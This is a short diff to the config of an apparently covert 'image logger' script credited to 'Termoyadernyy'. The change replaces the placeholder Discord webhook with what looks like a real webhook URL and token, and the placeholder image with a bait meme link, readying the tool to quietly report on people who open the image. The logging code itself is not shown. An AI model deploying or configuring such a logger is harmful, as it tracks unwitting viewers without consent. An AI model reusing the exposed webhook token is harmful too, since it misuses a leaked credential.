@@ -17,8 +17,8 @@ __author__ = "Termoyadernyy"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1336060111478722762/rVoM_GHLrsL7F6RbhQ1JOcuAWd7Sw4qDYaKu0UvUHKu4XIDbmSF9kba1JdV36q96XUKV",
+    "image": "https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fi.kym-cdn.com%2Fentries%2Ficons%2Ffacebook%2F000%2F041%2F943%2F1aa1blank.jpg&f=1&nofb=1&ipt=982dedf3e6fc7164e4c94f18bbfae5555f7de77bcc4703b69b4b189003608da9&ipo=images", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
